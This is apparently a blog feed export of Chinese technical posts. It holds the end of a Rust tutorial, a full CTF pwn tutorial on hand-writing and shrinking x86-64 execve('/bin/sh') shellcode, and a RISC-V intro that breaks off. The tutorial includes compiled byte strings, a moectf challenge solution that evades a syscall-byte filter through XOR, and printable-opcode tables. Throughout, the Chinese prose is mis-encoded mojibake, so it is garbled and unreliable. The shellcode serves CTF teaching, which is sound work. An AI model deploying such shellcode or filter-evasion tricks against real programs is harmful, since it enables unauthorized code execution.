å¯ä»¥ä¸»åŠ¨æŠ¥é”™<del>éª—å®ƒè¾“å‡º</del>ï¼Œ æ¯”å¦‚æœ¬äººå°±å–œæ¬¢ <code>assert!(false);</code>ï¼Œ ç„¶åå‰é¢è®°å¾—è¾“å‡ºä¸€ä¸‹ï¼Œç„¶åä½ å°±å¯ä»¥çœ‹åˆ°å›æ˜¾äº†ï¼šD</p><blockquote><p>  æµ‹è¯•å‡½æ•°å¯ä»¥æœ‰å¾ˆå¤šä¸ªï¼Œä¼šæŒ¨ä¸ªè·‘ä¸€é</p><p>  superå…³é”®å­—ä»£è¡¨å½“å‰æ¨¡å—ï¼ˆè¿™é‡ŒæŒ‡testï¼‰çš„çˆ¶æ¨¡å—ï¼Œæ‰€ä»¥ <code>use super::*;</code>å°±æ˜¯å¯¼å…¥çˆ¶æ¨¡å—çš„æ‰€æœ‰é¡¹ã€‚å¦‚æœä½ çš„register_playerç­‰éƒ½å®šä¹‰åœ¨main.rsä¸­ï¼Œé‚£ä¹ˆä½ åº”è¯¥æŠŠè¿™æ®µ<code>mod test&#123; &#125;</code>æ”¾åœ¨main.rsä¸­çš„æŸä¸ªä½ç½®ï¼ˆè¿™ä¿è¯äº†mainæ˜¯testçš„çˆ¶æ¨¡å—ï¼‰ã€‚</p></blockquote><h3 id="ä¼˜åŒ–ä½ çš„æ–‡ä»¶ç»“æ„ï¼ˆtodoï¼‰"><a href="#ä¼˜åŒ–ä½ çš„æ–‡ä»¶ç»“æ„ï¼ˆtodoï¼‰" class="headerlink" title="ä¼˜åŒ–ä½ çš„æ–‡ä»¶ç»“æ„ï¼ˆtodoï¼‰"></a>ä¼˜åŒ–ä½ çš„æ–‡ä»¶ç»“æ„ï¼ˆtodoï¼‰</h3>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcodeç¼–å†™å…¥é—¨</title>
      <link href="/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/"/>
      <url>/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Shellcodeç¼–å†™å…¥é—¨"><a href="#Shellcodeç¼–å†™å…¥é—¨" class="headerlink" title="Shellcodeç¼–å†™å…¥é—¨"></a>Shellcodeç¼–å†™å…¥é—¨</h1><h2 id="ä¸ºä»€ä¹ˆè¦æ‰‹å†™shellcodeï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æ‰‹å†™shellcodeï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æ‰‹å†™shellcodeï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦æ‰‹å†™shellcodeï¼Ÿ</h2><p>ç°åœ¨çš„é¢˜ç›®å¯¹shellcodeåšäº†è¶Šæ¥è¶Šå¤šçš„é™åˆ¶ï¼Œæ¯”å¦‚é™åˆ¶é•¿åº¦ï¼Œé™åˆ¶ç‰¹å®šå­—ç¬¦ç­‰ç­‰ã€‚æ‰€ä»¥ä¸€äº›é€šç”¨æ€§çš„shellcodeå·²ç»å¾ˆéš¾å†èµ·ä½œç”¨ï¼Œé’ˆå¯¹æŸä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ç¼–å†™ç‰¹å¼‚åŒ–shellcodeåŠ¿åœ¨å¿…è¡Œã€‚</p><span id="more"></span><h2 id="å¼€å§‹ä¹‹å‰"><a href="#å¼€å§‹ä¹‹å‰" class="headerlink" title="å¼€å§‹ä¹‹å‰"></a>å¼€å§‹ä¹‹å‰</h2><p>å½“ç„¶ä¹Ÿä¸å¯å¦è®¤shellcodeç”Ÿæˆå·¥å…·çš„ä¾¿æ·æ€§ã€‚é€‚å½“åˆ©ç”¨ä¹Ÿå¯ä»¥è¾…åŠ©æˆ‘ä»¬æ¥ç¼–å†™é€‚åˆçš„shellcodeã€‚<br>å¸¸ç”¨çš„å½“ç„¶æ˜¯pwntoolsæ¨¡å—ä¸‹çš„shellcraftï¼Œæ¯”å¦‚shellcraft.sh()æ¥ç”Ÿæˆexecve(â€˜&#x2F;bin&#x2F;shâ€™,0,0)çš„æ±‡ç¼–ä»£ç ï¼Œè¿˜æœ‰shellcraft.open(â€˜flagâ€™,0), shellcode.cat(â€˜flagâ€™)ç­‰ç­‰ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„ç”ŸæˆæŒ‡å®šæ¶æ„ä¸‹çš„æ±‡ç¼–ï¼Œ<strong>ä½†æ˜¯pwntoolsä¼šè€ƒè™‘å¾ˆå¤šæƒ…å†µï¼ˆæ¯•ç«Ÿè¦è€ƒè™‘é€šç”¨æ€§çš„ï¼‰ï¼Œæ‰€ä»¥è‚¯å®šä¼šæ¯”è¾ƒé•¿ï¼Œå®é™…ä¸Šæ˜¯æœ‰å¾ˆå¤§æ”¹è¿›ç©ºé—´çš„</strong>ã€‚æœ¬ç¯‡çš„ç›®çš„ä¸æ˜¯è®©è¯»è€…ä»0å¼€å§‹å†™shellcodeï¼ˆå†™çš„å¤šäº†ä¹Ÿå·®ä¸å¤šå¯ä»¥ç›´æ¥æ“äº†ï¼‰ï¼Œåªè¦èƒ½æ”¹è¿›ç”Ÿæˆå·¥å…·ç”Ÿæˆçš„shellcodeä»¥ç¬¦åˆæ¡ä»¶å°±å¯ä»¥äº†ã€‚</p><h2 id="ä»ç®€åŒ–å·¥å…·ç”Ÿæˆçš„shellcodeå¼€å§‹"><a href="#ä»ç®€åŒ–å·¥å…·ç”Ÿæˆçš„shellcodeå¼€å§‹" class="headerlink" title="ä»ç®€åŒ–å·¥å…·ç”Ÿæˆçš„shellcodeå¼€å§‹"></a>ä»ç®€åŒ–å·¥å…·ç”Ÿæˆçš„shellcodeå¼€å§‹</h2><p><strong>æœ¬ç¯‡ä»¥execve(â€˜&#x2F;bin&#x2F;shâ€™,0,0)ä¸ºä¾‹</strong></p><p>å‡å®šæˆ‘ä»¬çš„æ¶æ„æ˜¯x64çš„<br>å…ˆç”¨pwntoolsç”Ÿæˆä¸€æ®µæ¥çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcraft.sh()</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>å‘ç°å‰é¢<code>push 0x68</code>ï¼Œ å’Œ<code>mov raxï¼Œ0x732f2f2f6e69622f</code> ,<code>push rax</code> æ˜¯æŠŠ&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00pushåˆ°æ ˆä¸Šï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰å¯¹&#x2F;bin&#x2F;shå­—ç¬¦ä¸²åšæ£€æµ‹çš„è¯å¯ä»¥ç›´æ¥ä¼ &#x2F;bin&#x2F;sh\x00, æˆ–è€…&#x2F;bin&#x2F;&#x2F;shï¼Œæ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br></pre></td></tr></table></figure><p><code>mov rdi, rsp</code>æ˜¯æŠŠæŒ‡å‘&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„æŒ‡é’ˆä¼ ç»™rdiå¯„å­˜å™¨ï¼Œï¼ˆå› ä¸ºexecveçš„ç¬¬ä¸€ä¸ªå‚æ•°å®é™…ä¸Šéœ€è¦çš„æ˜¯å­—ç¬¦ä¸²çš„åœ°å€ï¼‰ï¼Œç”±äºåˆšåˆšæŠŠ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²pushåˆ°æ ˆä¸Šï¼ˆæ­¤æ—¶åœ¨æ ˆé¡¶ï¼Œä¹Ÿå°±è¯´rspæ­¤æ—¶æŒ‡å‘&#x2F;bin&#x2F;shï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡mov rdiï¼ŒrspæŠŠ&#x2F;bin&#x2F;shåœ°å€ä¼ ç»™rdiå¯„å­˜å™¨ã€‚</p><p>è¿™é‡Œéè¦æ”¹çš„è¯å¯ä»¥æ”¹æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rsp</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>è¿™æ ·å­ç¼–è¯‘ååªæœ‰2ä¸ªå­—èŠ‚ï¼ŒåŸæ¥çš„ç”¨movä¼ å‚æœ‰3ä¸ªå­—èŠ‚ï¼Œæ”¹å†™çš„æ“ä½œå°±æ˜¯æŠŠrspçš„å€¼pushåˆ°æ ˆä¸Šï¼Œåœ¨popåˆ°rdiï¼Œä¹Ÿèƒ½èµ·åˆ°ä¼ å‚çš„æ•ˆæœ</p><p><code> push 0x1010101 ^ 0x6873</code>    <code>xor dword ptr [rsp], 0x1010101</code></p><p>è¿™ä¸¤æ­¥åº”è¯¥æ˜¯ä¸ºäº†ç»•è¿‡æ½œåœ¨çš„shå­—ä¸²æ£€æµ‹ï¼Œæ‰€ä»¥å…ˆä¼ ä¸€ä¸ªå¼‚æˆ–åçš„å€¼ï¼Œåé¢å†å¼‚æˆ–å›shï¼Œ</p><p>å¦‚æœæ²¡æœ‰æ£€æµ‹çš„è¯æ˜¯å¯ä»¥ç›´æ¥<code>push 0x6873</code> <del><strong>ï¼ˆå…¶å®æ„Ÿè§‰è¿™ä¸€å¤§æ®µéƒ½æ²¡ä»€ä¹ˆç”¨ï¼‰</strong></del></p><p>åé¢çš„<code>xor esi, esi</code>æ˜¯æŠŠrsiç½®é›¶ï¼Œä½¿ç”¨esiï¼Œè€Œä¸ç”¨rsiï¼Œæ˜¯å› ä¸ºç”¨esiç¼–è¯‘çš„å­—èŠ‚ä¼šå°‘</p><p>ç„¶åpush 8ï¼Œ pop rsiï¼Œå°±æ˜¯ç›¸å½“äº<code>mov rsi, 8</code>ï¼Œ ç”¨push popç¼–è¯‘å‡ºæ¥çš„æ›´å°</p><p><strong>ä½†æ˜¯ç›´æ¥pushä¸€ä¸ªå€¼åˆ°æ ˆä¸Šè¦æ³¨æ„ï¼š</strong></p><blockquote><p>  push åªèƒ½pushä¸€ä¸ª32ä½æ•°ï¼Œè¶…è¿‡32ä½ä¸èƒ½ç¼–è¯‘ï¼ˆèµ·ç ç”¨pwntoolsçš„asmæ˜¯è¿™æ ·å­ï¼‰</p><p>  push è¶…è¿‡ä¸€ä¸ªå­—èŠ‚çš„æ•°ï¼Œä¼šè‡ªåŠ¨è¡¥å…¨æˆ32ä½ï¼Œæ¯”å¦‚push 0x6873ï¼Œå°±ä¼šç¼–è¯‘ä¸º hsh\x00\x00</p><p>  ä½†æ˜¯å¦‚æœåªæ˜¯pushä¸€ä¸ªå­—èŠ‚ï¼Œå°±ä¼šç¼–è¯‘ä¸º2ä¸ªå­—èŠ‚ï¼Œæ¯”å¦‚push 0x8ï¼Œæœºå™¨ç ä¸º j\x08</p></blockquote><p>åé¢è¿™æ®µæ²¡ææ¸…æ¥šç›®çš„æ˜¯ä»€ä¹ˆï¼Œå¦‚æœåªæ˜¯ä¸ºäº†æŠŠrsiå’Œrdxç½®0çš„è¯ï¼Œåªéœ€è¦2è¡Œxorå°±å¯ä»¥äº†</p><p>æœ€åè¦ç»™ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å·ç»™raxï¼ˆx64æ¶æ„execveè°ƒç”¨å·æ˜¯0x3bï¼‰</p><p>æœ€åsyscallï¼Œå®Œæˆè°ƒç”¨ï¼</p><p><del><strong>å¾ˆå¥½ï¼Œä½ å·²ç»å­¦ä¼šæ€ä¹ˆæ“shellcodeäº†</strong></del></p><p><strong>å®Œæ•´çš„æ±‡ç¼–ç ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f/* /bin/sh\x00 */</span><br><span class="line">push rax</span><br><span class="line">push rsp</span><br><span class="line">pop rdi/* rdi -&gt; /bin/sh */</span><br><span class="line">xor esi, esi/* rsi = 0 */</span><br><span class="line">xor edx, edx/* rdx = 0 */</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆæœºå™¨ç çœ‹ä¸€çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f/* /bin/sh\x00 */</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi/* rdi -&gt; /bin/sh */</span></span><br><span class="line"><span class="string">xor esi, esi/* rsi = 0 */</span></span><br><span class="line"><span class="string">xor edx, edx/* rdx = 0 */</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;H\xb8/bin/s\x00\x00PT_1\xf61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>åªæœ‰0x16ï¼ˆ22ï¼‰ä¸ªå­—èŠ‚ï¼ï¼ï¼</strong></p><p>å†çœ‹çœ‹åŸæ¥çš„shellcodeçš„æœºå™¨ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span>)</span><br><span class="line"><span class="number">48</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¼©å‡äº†ä¸€åŠå¤šçš„shellcodeä»£ç ï¼Œå¹¶ä¸”æ‰§è¡Œç›¸åŒçš„åŠŸèƒ½ï¼Œè¿™å°±æ˜¯æ‰‹æ“æ±‡ç¼–å¸¦æ¥çš„ï¼ˆï¼‰</p><h2 id="OKï¼Œä½ å·²ç»å­¦ä¼šæ‰‹æ“äº†ï¼Œç°åœ¨æ¥å®æˆ˜å§"><a href="#OKï¼Œä½ å·²ç»å­¦ä¼šæ‰‹æ“äº†ï¼Œç°åœ¨æ¥å®æˆ˜å§" class="headerlink" title="OKï¼Œä½ å·²ç»å­¦ä¼šæ‰‹æ“äº†ï¼Œç°åœ¨æ¥å®æˆ˜å§"></a>OKï¼Œä½ å·²ç»å­¦ä¼šæ‰‹æ“äº†ï¼Œç°åœ¨æ¥å®æˆ˜å§</h2><h3 id="moectf-changeable-shellcode"><a href="#moectf-changeable-shellcode" class="headerlink" title="moectf changeable_shellcode"></a>moectf changeable_shellcode</h3><p><em><strong>é™„ä»¶ï¼š</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/changeable_shellcode" target="_block">changeable_shellcode</a></p><p>ç®€å•æ¥è¯´å°±æ˜¯è¿‡æ»¤äº† <code>\x0f\x05</code> ç„¶åshellcodeé•¿åº¦ä¸è¶…è¿‡ 0x28</p><p>ä¸€ç§æ€è·¯æ˜¯ç›´æ¥åœ¨åé¢é€šè¿‡å¼‚æˆ–ä¹‹ç±»çš„æ–¹æ³•æŠŠsyscallå†™åœ¨åé¢</p><p>å¯ä»¥å…ˆæ ˆè¿ç§»åˆ°rwxæ®µï¼Œå½“ç„¶ä¸ºäº†é¿å…å¯¹æ ˆæ“ä½œå½±å“åˆ°åŸæ¥å†™çš„shellcodeï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œå°± addäº† 0x40</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsp</span><br><span class="line">add rsp, 0x40</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ­£å¸¸æ„é€  <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br><span class="line">push rax# æŠŠ /bin/sh\0 pushåˆ°æ ˆé¡¶</span><br><span class="line">push rsp# æŠŠ binshå­—ç¬¦ä¸²åœ°å€pushåˆ°æ ˆé¡¶</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi</span><br><span class="line">xor edx, edx</span><br><span class="line">xor eax, 0x6e696720 # å¼‚æˆ–æ„é€  \x0f\x05</span><br><span class="line">push rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">push rsp# æ­¤æ—¶rspæŒ‡å‘ \x0f\x05 (syscall)</span><br><span class="line">ret# æŠŠsyscallåœ°å€pushåˆ°æ ˆé¡¶å°±å¯ä»¥è·³è½¬è¿‡å»getshelläº†</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªshellcodeå°±åªéœ€è¦ 0x22 byteså®Œå…¨å¤Ÿç”¨</p><h2 id="ä¸€äº›ç‰¹æ®Šçš„è¦æ±‚çš„shellcode"><a href="#ä¸€äº›ç‰¹æ®Šçš„è¦æ±‚çš„shellcode" class="headerlink" title="ä¸€äº›ç‰¹æ®Šçš„è¦æ±‚çš„shellcode"></a>ä¸€äº›ç‰¹æ®Šçš„è¦æ±‚çš„shellcode</h2><h3 id="å¯è§å­—ç¬¦é™åˆ¶"><a href="#å¯è§å­—ç¬¦é™åˆ¶" class="headerlink" title="å¯è§å­—ç¬¦é™åˆ¶"></a>å¯è§å­—ç¬¦é™åˆ¶</h3><p>æœ‰æ—¶å€™ä¼šé‡åˆ°shellcodeåªèƒ½ä½¿ç”¨å¯è§å­—ç¬¦çš„é™åˆ¶</p><ul><li>å¤§éƒ¨åˆ†å¯„å­˜å™¨çš„push popéƒ½æ˜¯å¯è§çš„ï¼Œè€Œä¸”é™¤äº†r15ï¼Œr14è¿™ç±»çš„ï¼ŒåŸºæœ¬éƒ½æ˜¯1ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™å¯¹äºæŸäº›é™åˆ¶é•¿åº¦çš„æƒ…å†µä¸‹ç‰¹åˆ«å¥½ç”¨</li><li>éƒ¨åˆ†xorï¼Œsubï¼Œ andç­‰æ“ä½œ</li></ul><p>æˆ‘è¿™é‡Œç®€å•åˆ—äº†ä¸ªè¡¨ï¼ˆ</p><blockquote><p>  reg è¡¨ç¤ºå¯„å­˜å™¨ï¼Œåé¢çš„æ•°å­—æ˜¯ä½æ•°ï¼Œæ¯”å¦‚ reg8ï¼Œ å°±æ˜¯8ä½ï¼ˆä¹Ÿå°±æ˜¯1å­—èŠ‚ï¼‰çš„å¯„å­˜å™¨ï¼Œæ¯”å¦‚ alï¼Œahå¯„å­˜å™¨ï¼Œreg16å¦‚ axï¼Œdiå¯„å­˜å™¨</p><table><thead><tr><th>reg</th><th>include</th></tr></thead><tbody><tr><td>reg8</td><td>al, ah, bl, bh, cl, ch, dl, dh, spl, bpl, sil, dil, r8b, r9b, r10b, r11b, r12b, r13b, r14b, r15b</td></tr><tr><td>reg16</td><td>ax, bx, cx, dx, sp, bp, si, di, r8w, r9w, r10w, r11w, r12w, r13w, r14w, r15w</td></tr><tr><td>reg32</td><td>eax, ebx, ecx, edx, esp, ebp, esi, edi, r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</td></tr><tr><td>reg64</td><td>rax, rbx, rcx, rdx, rsp, rbp, rsi, rdi, r8, r9, r10, r11, r12, r13, r14, r15</td></tr></tbody></table><p>  im è¡¨ç¤ºç«‹å³æ•°ï¼Œåé¢çš„æ•°å­—ä¹Ÿæ˜¯ä»£è¡¨ä½æ•°ï¼Œ æ¯”å¦‚ 0x4141 å°±æ˜¯ im16 ï¼ˆ2å­—èŠ‚ç«‹å³æ•°ï¼‰</p><p>  mem è¡¨ç¤ºå†…å­˜åœ°å€ï¼Œåé¢çš„æ•°å­—è¡¨ç¤ºå–ä»è¯¥åœ°å€å¼€å§‹çš„å¤šå°‘ä½ï¼Œæ¯”å¦‚ mem8 è¡¨ç¤ºå–è¯¥åœ°å€å¼€å§‹çš„1å­—èŠ‚ï¼Œä¼šä¸ [] é…åˆä½¿ç”¨</p><p>  [xxx] è¡¨ç¤ºè§£å¼•ç”¨ï¼Œè¿™å’Œæ­£å¸¸çš„intel asmè¯­æ³•å·®ä¸å¤šï¼Œæ¯”å¦‚ xor ax, [rbx]</p><p>  ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ [rbx] å°±æ˜¯ä¸€ä¸ª [mem16]ï¼Œ æ˜¯å› ä¸ºå‰é¢axæ˜¯16ä½æ‰€ä»¥èƒ½æ¨å¯¼å‡º [rbx] éœ€è¦å–2å­—èŠ‚ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ˜¾ç¤ºçš„é€šè¿‡ qwordï¼Œ dwordï¼Œ wordï¼Œ byteæ¥æŒ‡å®šå–8&#x2F;4&#x2F;2&#x2F;1 å­—èŠ‚</p></blockquote><h4 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push &amp; pop"></a>push &amp; pop</h4><table><thead><tr><th>æ±‡ç¼–</th><th>æœºå™¨ç </th><th>æ±‡ç¼–</th><th>æœºå™¨ç </th></tr></thead><tbody><tr><td>pop rax</td><td>X</td><td>push rax</td><td>P</td></tr><tr><td>pop rcx</td><td>Y</td><td>push  rcx</td><td>Q</td></tr><tr><td>pop rdx</td><td>Z</td><td>push  rdx</td><td>R</td></tr><tr><td>pop rbx</td><td>[</td><td>push  rbx</td><td>S</td></tr><tr><td>pop rsp</td><td>\</td><td>push  rsp</td><td>T</td></tr><tr><td>pop rbp</td><td>]</td><td>push  rbp</td><td>U</td></tr><tr><td>pop rsi</td><td>^</td><td>push  rsi</td><td>V</td></tr><tr><td>pop rdi</td><td>_</td><td>push  rdi</td><td>W</td></tr><tr><td>pop r8</td><td>AX</td><td>push  r8</td><td>AP</td></tr><tr><td>pop r9</td><td>AY</td><td>push  r9</td><td>AQ</td></tr><tr><td>pop r10</td><td>AZ</td><td>push  r10</td><td>AR</td></tr><tr><td>pop r11</td><td>A[</td><td>push  r11</td><td>AS</td></tr><tr><td>pop r12</td><td>A\</td><td>push  r12</td><td>AT</td></tr><tr><td>pop r13</td><td>A]</td><td>push  r13</td><td>AU</td></tr><tr><td>pop r14</td><td>A^</td><td>push  r14</td><td>AV</td></tr><tr><td>pop r15</td><td>A_</td><td>push  r15</td><td>AW</td></tr></tbody></table><h4 id="xor-amp-add"><a href="#xor-amp-add" class="headerlink" title="xor &amp; add"></a>xor &amp; add</h4><ul><li><code>xor reg8, im8</code> , <code>xor reg16, im16</code> , <code>xor reg32/reg64, im32 </code>  ï¼ˆè¯•äº†ä¸€ä¸‹å¥½åƒåªæœ‰ rax ç³»åˆ—çš„æ‰è¡Œï¼Ÿï¼‰</li><li><code>xor reg8/reg16/reg32/reg64, [mem8/mem16/mem32/mem64]</code> ï¼ˆå¦‚æœè¦ç±»ä¼¼ rax + xxxxè¿™æ ·å­çš„åœ°å€æœ€å¥½è¿˜æ˜¯åŠ 1å­—èŠ‚åç§»å§ï¼Œè¶…è¿‡ä¸€ä¸ªå­—èŠ‚ï¼ˆå¦‚ï¼š[rax + 0x40404040] å°±å¾ˆéš¾å…¨æ˜¯å¯è§å­—ç¬¦äº†ï¼‰</li><li><code>sub reg8, im8</code></li></ul><p><strong>exampleï¼š</strong></p><table><thead><tr><th>æ±‡ç¼–</th><th>æœºå™¨çŒ«</th><th>æ±‡ç¼–</th><th>æœºå™¨çŒ«</th></tr></thead><tbody><tr><td>xor rax, 0x41424344</td><td>H5DCBA</td><td>xor eax, 0x41424344</td><td>5DCBA</td></tr><tr><td>xor ax, 0x4141</td><td>f5AA</td><td>xor ax, 0x6161</td><td>f5aa</td></tr><tr><td>xor al, 0x41</td><td>4A</td><td>xor al, 0x61</td><td>4a</td></tr><tr><td>xor al, byte [rbx + 0x40]</td><td>2CA</td><td>xor bx, [rcx + 0x41]</td><td>f3YA</td></tr><tr><td>xor edi, [rax + 0x40]</td><td>3x@</td><td>xor rbx, [rbp + 0x40]</td><td>H3]@</td></tr><tr><td>sub rax, 0x41424344</td><td>H-DCBA</td><td>sub eax, 0x41424344</td><td>-DCBA</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>todo</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Shellcode </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RISC-Vå…¥é—¨</title>
      <link href="/RISC-V%E5%85%A5%E9%97%A8/"/>
      <url>/RISC-V%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>å…ˆå†™ç‚¹ç®€å•çš„ï¼Œåé¢çœ‹æƒ…å†µè¡¥å……â€¦â€¦</strong></p><span id="more"></span><h1 id="ä»€ä¹ˆæ˜¯RISC-V"><a href="#ä»€ä¹ˆæ˜¯RISC-V" class="headerlink" title="ä»€ä¹ˆæ˜¯RISC-V"></a>ä»€ä¹ˆæ˜¯RISC-V</h1><p>ä¸€èˆ¬å¸¸è§çš„å¤„ç†å™¨æ¶æ„æœ‰x86å’Œarmï¼Œx86ä¸»è¦åœ¨PCç«¯ï¼ŒARMä¸»è¦ç”¨äºç§»åŠ¨ç»ˆç«¯ã€‚</p><p>ä½†æ˜¯armæœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œè®¾è®¡armæ¶æ„èŠ¯ç‰‡éœ€è¦ç»è¿‡armå…¬å¸æˆæƒï¼ŒåŒæ—¶ä¼šäº§ç”Ÿä¸€äº›è´¹ç”¨ï¼Œä½†æ˜¯ï¼Œå‡å¦‚æŸå¤©armå…¬å¸ä¸æˆæƒæ€ä¹ˆåŠï¼Ÿ<br>riscvæ¶æ„å°±æ˜¯ä¸ºäº†è§£å†³æ­¤é—®é¢˜ï¼Œriscvæœ€æ—©èµ·æºäºåŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ 